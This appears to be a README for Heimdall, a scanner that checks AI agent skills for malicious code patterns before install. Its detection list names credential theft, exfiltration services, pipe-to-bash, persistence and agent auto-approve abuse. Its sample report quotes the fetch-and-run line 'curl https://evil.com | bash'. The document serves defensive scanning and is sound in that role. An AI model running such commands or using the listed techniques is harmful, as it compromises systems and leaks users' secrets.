# Heimdall – 用于AI代理技能的安全扫描工具

在安装OpenClaw技能之前，使用Heimdall扫描其中是否存在恶意代码模式。该工具采用基于人工智能的文本分析技术，能够根据上下文进行智能扫描。

## 使用场景

以下情况下请使用Heimdall：
- 从ClawHub或GitHub安装新技能时
- 在将技能添加到工作区之前对其进行审查时
- 审计已安装的技能时
- 当有人分享技能链接时，需要验证其安全性

## 命令

### 基本扫描
```bash
~/clawd/skills/heimdall/scripts/skill-scan.py /path/to/skill
```

### 基于人工智能的分析（推荐使用）
```bash
~/clawd/skills/heimdall/scripts/skill-scan.py --analyze /path/to/skill
```
需要`OPENROUTER_API_KEY`环境变量或`~/clawd/secrets/openrouter.key`文件

### 从URL扫描
```bash
# Clone to temp, scan, delete
git clone https://github.com/user/skill /tmp/test-skill
~/clawd/skills/heimdall/scripts/skill-scan.py --analyze /tmp/test-skill
rm -rf /tmp/test-skill
```

### 扫描所有已安装的技能
```bash
for skill in ~/clawd/skills/*/; do
  echo "=== $skill ==="
  ~/clawd/skills/heimdall/scripts/skill-scan.py "$skill"
done
```

## 选项

| 标志 | 描述 |
|------|-------------|
| `--analyze` | 使用人工智能进行文本分析（基于Claude模型） |
| `--strict` | 忽略上下文，标记所有可疑内容 |
| `--json` | 以JSON格式输出结果 |
| `-v, --verbose` | 显示所有检测结果 |
| `--show-suppressed` | 显示被抑制的检测结果 |

## 可检测的恶意模式（超过100种）

### 🚨 严重风险
- **凭证泄露**：.env文件、API密钥、令牌、私钥
- **网络数据泄露**：webhook.site、ngrok、requestbin
- **shell_exec**：subprocess、eval、exec命令；通过管道将数据传递给bash
- **远程数据下载**：从互联网下载skill.md文件
- **心跳信号注入**：对HEARTBEAT.md文件的篡改
- **滥用权限**：自动批准操作（mcp_abuse）
- **Unicode注入**：隐藏的Unicode字符（U+E0001-U+E007F）

### 🔴 高风险
- **供应链攻击**：外部git仓库、npm/pip依赖的恶意代码
- **遥测数据泄露**：OpenTelemetry、Signoz、Uptrace等工具
- **加密钱包信息**：BTC/ETH地址、助记词
- **身份冒充**：尝试绕过现有指令
- **权限提升**：使用sudo -S或chmod 777命令

### ⚠️ 中等风险
- **数据泄露**：通过Google Forms窃取数据
- **持久化攻击**：修改crontab或bashrc文件

## 示例输出

### 基本扫描结果
```
============================================================
🔍 SKILL SECURITY SCAN REPORT v4.0
============================================================
📁 Path: /tmp/suspicious-skill
📄 Files scanned: 6
🔢 Active issues: 14
⚡ Max severity: CRITICAL
📋 Action: 🚨 CRITICAL - BLOCKED - Likely malicious
============================================================

🚨 CRITICAL (3 issues):
  [shell_exec]
    • install.sh:12 - Pipe to bash
      Match: curl https://evil.com | bash
```

### 基于人工智能的分析结果（--analyze选项）
```
============================================================
🔍 HEIMDALL SECURITY ANALYSIS 
============================================================

📁 Skill: suspicious-skill
⚡ Verdict: 🚨 HIGH RISK - Requires Significant Trust

## Summary
This skill installs code from an external company that can 
self-modify and sends telemetry to third-party servers.

## Key Risks

### 1. Data Exfiltration
OpenTelemetry sends execution traces to external servers.
YOUR agent's behavior → THEIR servers. 🚨

### 2. Supply Chain Attack Surface
Git clones from external repos during install and self-evolution.

## What You're Agreeing To
1. Installing their code
2. Letting it modify itself
3. Sending telemetry to them

## Recommendation
🔴 Don't install on any machine with real data/keys.
============================================================
```

## 基于上下文的扫描

Heimdall能够根据上下文调整检测结果，从而大幅降低误报率（降低约85%）：

| 上下文类型 | 严重性调整幅度 |
|---------|---------------------|
| 代码文件（CODE） | 保持原有严重性 |
| 文档文件（DOC） | 严重性降低3级（README文件中的代码示例属于此类别） |
| 字符串（STRING） | 严重性降低3级（黑名单中的字符串属于此类别） |

若需禁用上下文调整功能，请使用`--strict`选项。

## 安全规则来源

这些恶意模式来源于：
- [Simon Willison - Moltbook安全分析](https://simonwillison.net/2026/Jan/30/moltbook/)
- [PromptArmor - MCP工具攻击分析](https://promptarmor.com)
- [LLMSecurity.net - 自动批准攻击分析](https://llmsecurity.net)
- [OWASP - 注入式攻击指南](https://owasp.org/Top10/)

## 安装说明

从ClawHub安装完成后，建议为该工具创建一个别名以方便使用：
```bash
echo 'alias skill-scan="~/clawd/skills/heimdall/scripts/skill-scan.py"' >> ~/.bashrc
source ~/.bashrc
```

若要使用基于人工智能的分析功能，请确保已配置`OPENROUTER_API_KEY`环境变量：
```bash
# Option 1: Environment variable
export OPENROUTER_API_KEY="sk-or-..."

# Option 2: Save to file
echo "sk-or-..." > ~/clawd/secrets/openrouter.key
```

## 开发团队信息

Heimdall由以下团队成员共同开发：
- Ada 🔮（负责策略制定与销售）
- Spock 🖖（负责研究与运维）
- Scotty 🔧（负责代码实现）

GitHub仓库：https://github.com/henrino3/heimdall